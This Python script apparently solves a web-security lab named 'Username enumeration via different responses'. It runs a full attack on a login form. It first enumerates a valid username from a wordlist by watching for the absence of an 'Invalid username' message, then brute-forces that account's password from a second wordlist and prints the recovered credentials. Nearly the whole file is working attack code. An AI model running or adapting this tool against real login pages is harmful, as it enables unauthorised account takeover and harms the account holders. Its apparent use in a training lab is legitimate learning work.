import requests
import sys
import os
import getopt


def clear_screen():
  if os.name == 'posix':
    os.system('clear')
  else:
    os.system('cls')


def get_username(url, session):
  usernames = open('usernames.txt', 'r')

  for username in usernames:
    username = username.strip()
    data = {'username': username, 'password': 'a'}
    post_r = session.post(url, data=data)
    clear_screen()
    print(f"[!] The username is: \"{username}\"")

    if "Invalid username" not in post_r.text:
      valid_username = username
      usernames.close()
      return valid_username


def get_password(url, session, valid_username):
  passwords = open('passwords.txt', 'r')

  for password in passwords:
    password = password.strip()
    data = {'username': valid_username, 'password': password}
    post_r = session.post(url, data=data)
    clear_screen()
    print(f"[*] The username is: \"{valid_username}\"\n[!] The password is: \"{password}\"")

    if "Incorrect password" not in post_r.text:
      valid_password = password
      passwords.close()
      return valid_password


def main(argv):
  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print("This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login")
    print("\x1b[?25h")
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print("This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login")
      print("\x1b[?25h")
      sys.exit()

  session = requests.Session()
  username = get_username(url, session)
  password = get_password(url, session, username)
  clear_screen()

  print(f"[*] The username is: \"{username}\"\n[*] The password is: \"{password}\"")


if __name__ == "__main__":
  # Hide Cursor
  print("\x1b[?25l")
  main(sys.argv[1:])
  # Make cursor visible
  print("\x1b[?25h")
  sys.exit()